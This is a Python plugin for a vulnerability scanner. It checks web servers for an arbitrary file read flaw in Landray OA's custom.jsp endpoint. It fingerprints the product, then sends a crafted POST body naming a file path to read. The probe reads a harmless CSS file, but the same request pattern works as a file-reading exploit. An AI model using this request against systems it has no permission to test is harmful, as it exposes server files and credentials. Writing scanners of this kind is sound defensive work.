from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


'''
参考：
https://github.com/wgpsec/wiki/blob/abfe43fcff60c33cdefb206cd01c20a993fabfcf/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20custom.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
'''


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "蓝凌OA custom.jsp 任意文件读取漏洞"
        self.app_name = 'Landray'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        check = b'background-image:url(../icon/s/ranking.png)'
        url = target + "/sys/ui/extend/theme/default/style/icon.css"
        if check not in http_req(url).content:
            self.logger.debug("not Landray {}".format(target))
            return False

        path = "/sys/ui/extend/varkind/custom.jsp"

        body = {
            "var": '{"body":{"file":"/sys/ui/extend/theme/default/style/icon.css"}}'
        }

        url = target + path
        content = http_req(url, method='post', data=body).content

        if check in content:
            self.logger.success("found Landray 任意文件读取 {}".format(target))
            return url
